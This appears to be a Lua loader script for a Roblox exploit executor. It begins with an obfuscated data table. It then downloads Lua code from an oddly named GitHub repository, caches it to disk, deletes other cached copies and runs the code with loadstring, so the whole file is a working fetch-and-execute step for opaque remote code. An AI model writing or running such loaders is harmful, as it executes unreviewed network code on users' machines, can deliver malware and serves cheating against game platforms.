_bsdata0 = {
    4047411564,
    "BA2C45-0-4ARAE_2-DL44LA3C4EE_E04B3D.EL.-3.R32005ELE3R45CDL4_CE0ECE50AC3.-B.4_1RE0LC-C_D_E5335B0DR35B-2BB..DE-DE52B5CEDA4L-5DL4.C_CRL.0",
    26392908,
    "\178\77\37\91\27\114\32\24\159\232\99\244\201\199\168\151\107\0\71\67\190\154\205\19\64\157\115\99\170",
    32391550,
    3877575984,
    1786988043,
    2851531,
    2645682,
    53335476,
    "af20237341538b947295a9aa523a16b97016920832b60b3cfda787f45b78ea2d637bdcb7a8e967fa82878d7c7f27579304ba9312d553012c2ced40311020390d415e1fb8b97b394d9c73a23951633b633428cb207d0b05151acd7842b5f414f67792fb01828558bb0fce488de4b4c1b90ab1c0587d1adb5b51f52a4d450bc41cac3713881d7b78e2ac4266bc9814c0cf57a55ea37a46ba32fe94f8d1ceb6d1ae8fd4791029d6144860a5c1c64128a3694709791384a0278841e07340c451fc962b2701f8c30c58e5f2",
    "\220\159\221\176\13\80\86\178\29\245\90\164\167\95\51\53\21\48\93\183\105\227\13\163"
}
local originalHttpGet = HttpGet

HttpGet = function(...)
    print(...)
    return originalHttpGet(...)
end

local folder = "static_content_130525"
local id = "74c74f95fd0-marbeg"

local content

pcall(function()
    content = readfile(folder .. "/init-" .. id .. ".lua")
end)

if content and #content > 2000 then
    content = loadstring(content)
else
    content = nil
end

if content then
    return content()
else
    pcall(makefolder, folder)

    content = game:HttpGet(
        "https://raw.githubusercontent.com/JLDimitri74/zserrfsredfsdf/refs/heads/main/okok.lua"
        .. (_ca920af6193 or "")
    )

    writefile(
        folder .. "/init-" .. id .. ".lua",
        content
    )

    pcall(function()
        for _, file in pairs(listfiles("./" .. folder)) do
            local name = file:match("(init[%w%-]*).lua$")

            if name and name ~= ("init-" .. id) then
                pcall(
                    delfile,
                    folder .. "/" .. name .. ".lua"
                )
            end
        end
    end)

    return loadstring(content)()
end
